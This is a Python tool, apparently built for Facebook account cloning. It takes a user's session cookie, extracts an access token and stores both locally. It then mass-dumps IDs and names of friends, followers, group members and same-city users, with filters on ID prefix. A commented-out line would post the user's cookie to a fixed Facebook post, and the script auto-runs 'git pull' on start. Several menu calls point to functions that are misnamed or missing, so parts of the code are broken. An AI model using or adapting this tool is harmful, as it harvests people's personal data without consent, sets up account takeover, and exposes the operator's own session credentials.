import requests;ses = requests.Session()
import re,os,sys,time,bs4
from bs4 import BeautifulSoup as parser

##-----FITUR GLOBAL---###
id,namafile = [],[]
try:pm = open(".pemisah.txt","r").read()
except:pm = "|"

##-----WARNA PRINT----##
J = '\x1b[38;5;208m'
P = '\033[m'
K = '\033[93m'
hh = '\033[92m'
M = '\033[91m' # MERAH


##-----FITUR AUTO PRINT---##
def error_file():
	exit(f" [{K}!{P}] input nama file cukup dengan : nama.json/nama.txt")
def simpan():
	file = namafile[0]
	print(f"\r{P} ─────────────────────────────")
	print(f" [{hh}!{P}] Total accounts as much : %s\n [{hh}!{P}] pemisah file memakai : %s\n [{hh}!{P}] file tersimpan di    : /sdcard/%s"%(len(id),pm,file))
	exit()


##----FITUR CLEAR ----##
def bersih():
	os.system("clear")


##----FITUR LOGIN----###
def login():
	print(f"""

\x1b[1;93m########  ##     ## ##     ## ########  
##     ## ##     ## ###   ### ##     ## 
##     ## ##     ## #### #### ##     ## 
##     ## ##     ## ## ### ## ########  
##     ## ##     ## ##     ## ##        
##     ## ##     ## ##     ## ##        
########   #######  ##     ## ##        
[+]====================================================[+]
[+] CREATED BY   :  U7P4L IN                           [+]
[+] COUNTRY      :  BANGLADESH                         [+]
[+] ON GITHUB    :  U7P4L-IN                           [+]
[+] TOOL STATUS  :  RANDOM CLONING                     [+]
[+] TOOL VERSION :  0.5                                [+]
[+]====================================================[+]\n\n\n""")
	cookie = input(f" [{hh}!{P}] cookie : ")
	try:
		babas = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
		data = ses.get("https://business.facebook.com/business_locations",headers=babas,cookies={"cookie":cookie})
		token = re.search('(EAAG\w+)',str(data.text)).group(1)
		open(".token.txt", "w").write(token)
		open(".cookie.txt", "w").write(cookie)
		#ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies={"cookie":cookie})
		menu()
	except Exception as e:
		try:
			os.remove(".token.txt")
			os.remove(".cookie.txt")
		except:pass
		exit(f"\n [{K}!{P}] cookie invalid")
		
		

##----MENU UTAMA---##
def menu():
	bersih()
	mek,meki = [],[]
	try:t=open(".token.txt", "r").read();c={"cookie":open(".cookie.txt","r").read()};ah = ses.get(f"https://graph.facebook.com/me?&access_token={t}",cookies=c).json()["gender"];mu = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={t}",cookies=c).json()["name"].split(' ')[0].lower();mek.append(mu);meki.append(ah)
	except Exception as e:print(f" [{hh}!{P}] cookie invalid");time.sleep(2);os.system('clear');login()
	if len(meki)<=4:
		nama = mek[0]+" ganteng"
	elif len(meki)>=6:
		nama = mek[0]+" cantik"
	else:
		nama = mek[0]		
	print(f"""

\x1b[1;93m########  ##     ## ##     ## ########  
##     ## ##     ## ###   ### ##     ## 
##     ## ##     ## #### #### ##     ## 
##     ## ##     ## ## ### ## ########  
##     ## ##     ## ##     ## ##        
##     ## ##     ## ##     ## ##        
########   #######  ##     ## ##        
[+]===============================================[+]
[+] CREATED BY   :  U7P4L IN                      [+]
[+] COUNTRY      :  BANGLADESH                    [+]
[+] ON GITHUB    :  U7P4L-IN                      [+]
[+] TOOL STATUS  :  FILE DUMPING                  [+]
[+] TOOL VERSION :  0.4                           [+]
[+]===============================================[+]""")
	print(f"\n\n\n [{hh}1{P}]. Public dumps\n [{hh}2{P}]. dump fairy tale\n [{hh}3{P}]. dump followers\n [{hh}4{P}]. dump group publik\n [{hh}5{P}]. dump unli akun\n [{hh}6{P}]. dump sesuai kota \n [{hh}7{P}]. setting pemisah file")
	bas = input(" menu : ")
	print(f"{P} ─────────────────────────────")
	if bas in ["1"]:Public(t,c)
	elif bas in ["2"]:Fairytale(t,c)
	elif bas in ["3"]:Follow(t,c)
	elif bas in ["4"]:Group(t,c)
	elif bas in ["5"]:dump_unli(nama,t,c)
	elif bas in ["6"]:get_sekota(t,c,nama)
	elif bas in ["7"]:
		try:os.remove(".pemisah.txt")
		except:pass
		print(f"\n [{hh}!{P}] examples of commonly used file separators\n contoh = | / • / = / <=> / <> / + ")
		pms = input(" pemisah baru : ")
		open(".pemisah.txt","w").write(pms)
		exit(f" [{hh}!{P}] pemisah baru berhasil di setting")
	else:exit(f" [{K}!{P}] isi yang benar")
		

###---[ GET TEMAN SEKOTA ]---### 100054768982372
def dump_kota(t,c,akun,nama):
	global id
	bersih()
	print(f"""

\x1b[1;93m########  ##     ## ##     ## ########  
##     ## ##     ## ###   ### ##     ## 
##     ## ##     ## #### #### ##     ## 
##     ## ##     ## ## ### ## ########  
##     ## ##     ## ##     ## ##        
##     ## ##     ## ##     ## ##        
########   #######  ##     ## ##        
[+]===============================================[+]
[+] CREATED BY   :  U7P4L IN                      [+]
[+] COUNTRY      :  BANGLADESH                    [+]
[+] ON GITHUB    :  U7P4L-IN                      [+]
[+] TOOL STATUS  :  FILE DUMPING                  [+]
[+] TOOL VERSION :  0.4                           [+]
[+]===============================================[+]""")
	try:
		info = ses.get(f'https://graph.facebook.com/{akun}?&access_token={t}',cookies=c).json()
		kota = info['hometown']['name']
		name,uid = info['name'],info['id']
	except: print(f" [{M}>{P}] unpublic account");exit()
	print(f'\n\n\n [{hh}>{P}] target account data \n [{hh}>{P}] akun : {hh}{uid}{P}\n [{hh}>{P}] nama : {hh}{name}{P}\n [{hh}>{P}] kota : {hh}{kota}{P}')
	print(f"{P} ─────────────────────────────")
	apa = input(f' [{hh}01{P}] dump id sekota\n [{hh}02{P}] dump semua id\n pilih : ')
	print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
	try:
		nam = input(" nama file : ")
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:error_file()
	if apa in ['1','01']:
		data = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()
		for x in data['friends']['data']:
			try:
				if kota in str(x['hometown']['name']):
					id.append('%s'%(x['id']))
					xx.write('%s%s%s\n'%(x['id'],pm,x['name']))
					print('\r being dumped %s id'%(len(id)),end=" ")
					sys.stdout.flush()
				else:pass
			except:pass
		simpan()
	elif apa in ['2','02']:
		data = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name)&access_token={t}',cookies=c).json()
		for x in data['friends']['data']:
			try:
				id.append('%s'%(x['id']))
				xx.write('%s%s%s\n'%(x['id'],pm,x['name']))
				print('\r being dumped %s id'%(len(id)),end=" ")
				sys.stdout.flush()
			except:pass
		simpan() 
		

###---[ DUMP KOTA ]---###
def get_sekota(t,c,nama):
	sekota, nokota = [], []
	target, nom = [], 0
	getid = []
	print(f" [{hh}>{P}] make sure the target is public")
	akun = input(' target : ')
	try:
		for tmn in ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()['friends']['data']:
			try:
				id = tmn["id"]
				mx = tmn["name"]
				kot = tmn["hometown"]["name"] 
				target.append(str(id)+'|'+str(mx)+'|'+str(kot))
			except:pass
	except Exception as e: print(f" [{M}>{P}] unpublic account");exit()
	tampung = []
	for x in target:tampung.append(x)
	target.clear()
	uru = input(f' select dump order\n [{hh}1{P}] from new \n [{hh}2{P}] from old\n order : ')
	if uru in ['1']:
		for x in tampung:target.insert(0,x)
	else:
		for x in tampung:target.append(x)
	print(f' [{hh}>{P}] dump is running, ctrl+c to stop')
	print(f"{P} ─────────────────────────────")
	for data in target:
		id,na,ko = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		try:
			for x in ses.get(f'https://graph.facebook.com/{id}?fields=friends.fields(id,name,username,hometown)&access_token={t}',cookies=c).json()['friends']['data']:
				try:nokota.append(x['username']+'|'+x['name'])
				except:nokota.append(x['id']+'|'+x['name'])
				try:
					if ko in str(x['hometown']['name']):
						try:sekota.append(x['username']+'|'+x['name'])
						except:sekota.append(x['id']+'|'+x['name'])
				except:pass
			sk = str(len(sekota))
			nk = str(len(nokota))
			getid.append(id)
			nom+=1
			print(f' [{hh}>{P}] account number {hh}{nom}{P}\n [{hh}>{P}] account number  : {hh}{na}{P}\n [{hh}>{P}] account uid   : {hh}{id}{P}\n [{hh}>{P}] account city  : {hh}{ko}{P} \n [{hh}>{P}] uid total  : {hh}{nk}{P}\n [{hh}>{P}] uid as a quarter : {hh}{sk}{P}\n')
			nokota.clear()
			sekota.clear()
		except KeyError:
			try:
				for x in ses.get(f'https://graph.facebook.com/{id}?fields=friends.fields(id,name)&access_token={t}',cookies=c).json()['friends']['data']:nokota.append(x['id']+'|'+x['name'])
				nk = str(len(nokota))
				getid.append(id)
				nom+=1
				print(f' [{K}>{P}] account number {K}{nom}{P}\n [{K}>{P}] nama akun  : {K}{na}{P}\n [{K}>{P}] uid akun   : {K}{id}{P}\n [{K}>{P}] uid total  : {K}{nk}{P}\n')
				nokota.clear()
			except Exception as e:
				print(f' [{M}>{P}] unpublic account\n [{M}>{P}] nama akun  : {M}{na}{P}\n [{M}>{P}] uid akun   : {M}{id}{P}\n');pass
		except KeyboardInterrupt:
			print(f"{P} ─────────────────────────────")
			abc = input(f' [{hh}>{P}] please enter account number\n nomor : ')
			akun = getid[int(abc)-1]
			dump_kota(t,c,akun,nama)
		except requests.exceptions.ConnectionError:
			print(f"{P} ─────────────────────────────")
			abc = input(f' [{hh}>{P}] please enter account number\n nomor : ')
			akun = getid[int(abc)-1]
			dump_kota(t,c,akun,nama)
			

##----DUMP PUBLIK----##
def publik(t,c):
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id akun : ")
		nam = input(" nama file : ")
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		bas = ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				id.append(pi['id']+pm+pi['name'])
				xx.write(pi["id"]+pm+pi["name"]+"\n")
				print('\r being dumped %s id'%(len(id)),end=" ")
				sys.stdout.flush()
			except:continue
		simpan()
	except (KeyError,IOError):
		exit(f" [{K}!{P}] unpublic account")



##----DUMP MASAL----##
def masal(t,c):
    print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
    try:
        bz=0
        apa = int(input(f' id number : '))
        nam = input(" nama file : ")
        file = ("/sdcard/"+nam)
        xx = open(file,"w")
        namafile.append(nam)
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	pil = input(f'\r Enter account to {bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      id.append(pi['id']+pm+pi['name'])
    		      try:xx.write(pi["id"]+pm+pi["name"]+"\n")
    		      except:error_file()
    		      print('\r being dumped %s id'%(len(id)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except KeyError:
    	      print(f" [{K}!{P}] unpublic account ")
    	      continue		                       		
    simpan()
          
              

##----DUMP FOLLOWERS----##
def follow(t,c):
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id akun : ")
		nam = input(" nama file : ")
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for pi in ses.get(f"https://graph.facebook.com/{pil}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={t}",cookies=c).json()["subscribers"]["data"]:
			id.append(pi['id']+pm+pi['name'])
			xx.write(pi["id"]+pm+pi["name"]+"\n")
			print('\r being dumped %s id'%(len(id)),end=" ")
			sys.stdout.flush()
			time.sleep(0.0002)
	except KeyError:
		exit(f" [{K}!{P}] unpublic account")
	simpan()
          


##----DUMP GROUP----##          
def group(t,c):
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		idt = input(" id group : ")
		nam = input(" nama file : ")
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	url = "https://mbasic.facebook.com/groups/"+idt
	data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
	try:mek = re.findall('<head><title>(.*?)</title>',str(data))[0]
	except:mek = ''
	nama = mek.split('Grup')[0]
	print(f" [{hh}!{P}] nama group : {nama}")
	get_datagrup(nam,url)
	simpan()
def get_datagrup(nam,url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
		for cari in data.find_all('table'):
			liatnih = cari.text
			spl = liatnih.split(' ')
			if 'mengajukan' in spl:
				idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
				idyou =	idsiapa[0].replace('content_owner_id_new.','')
				namayou = liatnih.replace(' mengajukan pertanyaan .','')
				idku = idyou+pm+namayou
				if idku in id:continue
				else:
					open('/sdcard/'+nam,'a+').write(idku+'\n')
					id.append(idku)
					print('\r being dumped %s id, ctrl+c untuk stop'%(len(id)),end=" ")
					sys.stdout.flush()
			elif '>' in spl:
				idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
				idyou =	idsiapa[0].replace('content_owner_id_new.','')
				namayou = liatnih.split(' > ')[0]
				idku = idyou+pm+namayou
				open(nam+".json","w").write(idku+"\n")
				if idku in id:
					continue
				else:
					open('/sdcard/'+nam,'a+').write(idku+'\n')
					id.append(idku)
					print('\r being dumped %s id, ctrl+c untuk stop'%(len(id)),end=" ")
					sys.stdout.flush()
			else:
				continue
		for g in data.find_all('a'):
			css = str(g).split('>')
			if 'Lihat Postingan Lainnya</span' in css:
				bcj = str(g).replace('<a href="','').replace('amp;','')
				bcj2 = bcj.split(' ')[0].replace('"><img','')
				get_datagrup(nam,'https://mbasic.facebook.com'+bcj2)
	except KeyboardInterrupt:
		simpan()
	except Exception as e:
		simpan()                                
				

###--- DUMP UNLIMITED ----###
def dump_unli(nama,t,c):
	bersih()
	print(f"""

\x1b[1;93m########  ##     ## ##     ## ########  
##     ## ##     ## ###   ### ##     ## 
##     ## ##     ## #### #### ##     ## 
##     ## ##     ## ## ### ## ########  
##     ## ##     ## ##     ## ##        
##     ## ##     ## ##     ## ##        
########   #######  ##     ## ##        
[+]===============================================[+]
[+] CREATED BY   :  U7P4L IN                      [+]
[+] COUNTRY      :  BANGLADESH                    [+]
[+] ON GITHUB    :  U7P4L-IN                      [+]
[+] TOOL STATUS  :  FILE DUMPING                  [+]
[+] TOOL VERSION :  0.4                           [+]
[+]===============================================[+]""")
	print(f"\n\n\n [{hh}!{P}]  select the type you want to dump")
	print(f" [{hh}1{P}]. dump first 10008-10005\n [{hh}2{P}].dump first 10005-10001\n [{hh}3{P}]. dump first10001-100005\n [{hh}4{P}]. dump first 100005-100001\n [{hh}5{P}]. dump first 10000009++\n [{hh}6{P}]. setting id manual")
	afa = input(' menu : ')
	print(f"{P} ─────────────────────────────")
	if afa in ['1','01']:
		masal_muda(t,c)
	elif afa in ['2','02']:
		masal_muda2(t,c)
	elif afa in ['3','03']:
		masal_semi(t,c)
	elif afa in ['4','04']:
		masal_semi2(t,c)
	elif afa in ['5','05']:
		masal_old(t,c)
	elif afa in ['6','06']:
		masal_manual(t,c)
	else:
		exit(f" [{K}!{P}] correct content")


###--- MASAL MANUAL ----###
def masal_manual(t,c):
	id1,id2  = [],[]
	print(f" [{hh}!{P}] enter a digit prefix, Ex: 10005/100001")
	digit = input(' digit awal : ')
	if len(digit)>=9:
		exit(f" [{K}!{P}] id prefix only has 5 to 8 digits ")
	try:
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] unpublic account")
	for uid in id1:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if digit in str(baz['id']):
					if baz in id:
						pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped %s id'%(len(id)),end="");sys.stdout.flush()
						if len(id)==limit:simpan()
				else:pass
		except Exception as e:pass	


###--- DUMP MUDA ---###
def masal_muda(t,c):
	id1,id2  = [],[]
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] unpublic account")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if "10008" in str(baz['id']) or "10007" in str(baz['id']) or "10006" in str(baz['id']) or "10005" in str(baz['id']):
					if baz in id:
						pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped %s id'%(len(id)),end="");sys.stdout.flush()
						if len(id)==limit:simpan()
				else:pass
		except Exception as e:pass	
				

###--- DUMP MUDA 2 ---###
def masal_muda2(t,c):
	id1,id2  = [],[]
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] unpublic account")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if "10001" in str(baz['id']) or "10002" in str(baz['id']) or "10003" in str(baz['id']) or "10004" in str(baz['id']) or "10005" in str(baz['id']):
					if baz in id:
						pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped %s id'%(len(id)),end="");sys.stdout.flush()
						if len(id)==limit:simpan()
				else:pass
		except Exception as e:pass
	
	
###--- DUMP SEMI ---###
def masal_semi(t,c):
	id1,id2  = [],[]
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] akun unpublic account ")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if "10001" in str(baz['id']) or "100009" in str(baz['id']) or "100008" in str(baz['id']) or "100007" in str(baz['id']) or "100006" in str(baz['id']) or "100005" in str(baz['id']):
					if baz in id:
						pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped %s id'%(len(id)),end="");sys.stdout.flush()
						if len(id)==limit:simpan()
				else:pass
		except Exception as e:pass
	
	
###--- DUMP SEMI 2 ---###
def masal_semi2(t,c):
	id1,id2  = [],[]
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] Unpublic Account")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if "100001" in str(baz['id']) or "100002" in str(baz['id']) or "100003" in str(baz['id']) or "100004" in str(baz['id']) or "100005" in str(baz['id']):
					if baz in id:
						pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped%s id'%(len(id)),end="");sys.stdout.flush()
						if len(id)==limit:simpan()
				else:pass
		except Exception as e:pass	
	
	
###--- MASAL OLD ---###
def masal_old(t,c):
	id1,id2  = [],[]
	try:
		print(f" [{hh}!{P}] filename example : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' id number  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] unpublic account")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f'https://graph.facebook.com/{uid}?fields=friends.fields(name,id)&access_token={t}',cookies=c).json()['friends']['data']:
				if "10008" in str(baz['id']) or "10007" in str(baz['id']) or "10006" in str(baz['id']) or "10005" in str(baz['id']) or "10001" in str(baz['id']) or "10002" in str(baz['id']) or "10003" in str(baz['id']) or "10004" in str(baz['id']) or "10005" in str(baz['id']) or "10001" in str(baz['id']) or "100009" in str(baz['id']) or "100008" in str(baz['id']) or "100007" in str(baz['id']) or "100006" in str(baz['id']) or "100005" in str(baz['id']) or "100001" in str(baz['id']) or "100002" in str(baz['id']) or "100003" in str(baz['id']) or "100004" in str(baz['id']) or "100005" in str(baz['id']):pass
				else:
					if baz in id:pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r being dumped%s id'%(len(id)),end="")
						sys.stdout.flush()
						if len(id)==limit:simpan()
		except Exception as e:pass
	
	

										
def main():
	try:os.system('git pull')
	except:pass
	try:os.system('clear')
	except:pass
	menu()								
if __name__=="__main__":
		main()		
		
		
		

		
		
